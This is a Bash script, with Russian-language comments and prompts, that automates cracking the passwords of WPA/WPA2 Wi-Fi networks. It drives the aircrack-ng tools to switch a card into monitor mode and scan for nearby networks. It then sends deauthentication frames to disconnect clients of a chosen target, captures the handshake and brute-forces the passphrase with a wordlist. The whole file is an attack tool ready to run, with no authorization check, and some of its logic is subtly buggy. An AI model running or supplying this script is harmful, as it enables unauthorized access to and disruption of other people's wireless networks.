#!/bin/bash
# wpa-cracker.sh – автоматический захват и взлом WPA/WPA2 handshake

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
PURPLE='\033[0;35m'
NC='\033[0m'

check_deps() {
    deps=("airmon-ng" "airodump-ng" "aireplay-ng" "aircrack-ng" "iwconfig" "ifconfig")
    missing=()
    for cmd in "${deps[@]}"; do
        if ! command -v "$cmd" &>/dev/null; then
            missing+=("$cmd")
        fi
    done
    if [ ${#missing[@]} -ne 0 ]; then
        echo -e "${RED}[!] Отсутствуют утилиты: ${missing[*]}${NC}"
        echo -e "${YELLOW}[*] Установите: sudo apt install aircrack-ng${NC}"
        exit 1
    fi
}

list_interfaces() {
    echo -e "${CYAN}[*] Доступные беспроводные интерфейсы:${NC}"
    iwconfig 2>/dev/null | grep -E '^[a-zA-Z0-9]+' | awk '{print $1}' | while read iface; do
        state=$(iwconfig "$iface" 2>/dev/null | grep -o "Mode:Monitor" || echo "Managed")
        echo "  $iface ($state)"
    done
}

set_monitor() {
    local iface=$1
    echo -e "${CYAN}[*] Перевод $iface в режим монитора...${NC}"
    sudo airmon-ng start "$iface" > /dev/null 2>&1
    # airmon-ng создаёт интерфейс с суффиксом mon, например wlan0mon
    mon_iface=$(sudo airmon-ng | grep -E "$iface" | grep -oE "$iface"mon)
    if [ -z "$mon_iface" ]; then
        mon_iface="${iface}mon"
        sudo ip link set "$mon_iface" up 2>/dev/null
    fi
    echo -e "${GREEN}[+] Мониторный интерфейс: $mon_iface${NC}"
    echo "$mon_iface"
}

scan_networks() {
    local mon_iface=$1
    echo -e "${CYAN}[*] Сканирование сетей (10 сек)...${NC}"
    sudo timeout 10 airodump-ng "$mon_iface" -w /tmp/wpa-scan --output-format csv 2>/dev/null
    # Парсим CSV
    echo -e "\n${CYAN}[*] Доступные сети:${NC}"
    awk -F',' '/^Station/ {exit} /^[0-9a-fA-F]{2}:/ {print NR-1": " $1 " " $4 " (канал "$3")"}' /tmp/wpa-scan-01.csv | grep -v "BSSID" | head -20
}

select_target() {
    echo -e "${YELLOW}[?] Введите BSSID (MAC) целевой сети (например, 00:11:22:33:44:55):${NC}"
    read -r bssid
    echo -e "${YELLOW}[?] Введите канал (из сканирования):${NC}"
    read -r channel
    echo -e "${YELLOW}[?] Введите имя интерфейса монитора (например, wlan0mon):${NC}"
    read -r mon_iface
}

capture_handshake() {
    local mon_iface=$1
    local bssid=$2
    local channel=$3
    local capture_file="/tmp/wpa-capture"

    echo -e "${CYAN}[*] Запуск захвата на канале $channel...${NC}"
    sudo airodump-ng -c "$channel" --bssid "$bssid" -w "$capture_file" "$mon_iface" &
    airodump_pid=$!
    sleep 3

    echo -e "${CYAN}[*] Отправка деаутентификации клиентам...${NC}"
    sudo aireplay-ng -0 5 -a "$bssid" "$mon_iface" > /dev/null 2>&1 &
    aireplay_pid=$!

    echo -e "${YELLOW}[*] Ожидание захвата handshake (макс. 30 сек)...${NC}"
    timeout 30 tail -f /dev/null 2>/dev/null &
    timeout_pid=$!

    # Ждём, пока в файле появится рукопожатие (WPA handshake)
    while true; do
        if grep -q "WPA handshake" /tmp/wpa-capture-01.cap 2>/dev/null; then
            echo -e "${GREEN}[+] Handshake захвачен!${NC}"
            sudo kill $airodump_pid $aireplay_pid $timeout_pid 2>/dev/null
            break
        fi
        if ! ps -p $airodump_pid > /dev/null 2>&1; then
            echo -e "${RED}[!] Захват прерван.${NC}"
            sudo kill $aireplay_pid 2>/dev/null
            return 1
        fi
        sleep 1
    done

    echo -e "${GREEN}[+] Handshake сохранён в /tmp/wpa-capture-01.cap${NC}"
    echo "/tmp/wpa-capture-01.cap"
}

crack_password() {
    local cap_file=$1
    echo -e "${YELLOW}[?] Укажите путь к словарю (по умолчанию /usr/share/wordlists/rockyou.txt):${NC}"
    read -r wordlist
    if [ -z "$wordlist" ]; then
        wordlist="/usr/share/wordlists/rockyou.txt"
    fi
    if [ ! -f "$wordlist" ]; then
        echo -e "${RED}[!] Словарь не найден.${NC}"
        echo -e "${YELLOW}[*] Скачайте rockyou: sudo apt install wordlists${NC}"
        return 1
    fi

    echo -e "${CYAN}[*] Запуск aircrack-ng...${NC}"
    sudo aircrack-ng -w "$wordlist" "$cap_file" | tee /tmp/crack-result.txt
    if grep -q "KEY FOUND" /tmp/crack-result.txt; then
        password=$(grep "KEY FOUND" /tmp/crack-result.txt | awk -F'[: ]' '{print $NF}')
        echo -e "${GREEN}Пароль найден: $password${NC}"
    else
        echo -e "${RED}[!] Пароль не найден в словаре. Попробуйте другой словарь.${NC}"
    fi
}

main() {
    echo -e "${PURPLE}╔══════════════════════════════════════════╗${NC}"
    echo -e "${PURPLE}║      WPA CRACKER v1.0                 ║${NC}"
    echo -e "${PURPLE}╚══════════════════════════════════════════╝${NC}"
    check_deps
    list_interfaces
    echo -e "${YELLOW}[?] Введите имя интерфейса (например, wlan0):${NC}"
    read -r iface
    mon_iface=$(set_monitor "$iface")
    scan_networks "$mon_iface"
    select_target
    cap_file=$(capture_handshake "$mon_iface" "$bssid" "$channel")
    if [ $? -eq 0 ] && [ -f "$cap_file" ]; then
        crack_password "$cap_file"
    else
        echo -e "${RED}[!] Не удалось захватить handshake.${NC}"
    fi
    echo -e "${CYAN}[*] Очистка временных файлов...${NC}"
    rm -f /tmp/wpa-* 2>/dev/null
    echo -e "${CYAN}[*] Выключение мониторного режима...${NC}"
    sudo airmon-ng stop "$mon_iface" > /dev/null 2>&1
    echo -e "${GREEN}[+] Готово.${NC}"
}

main
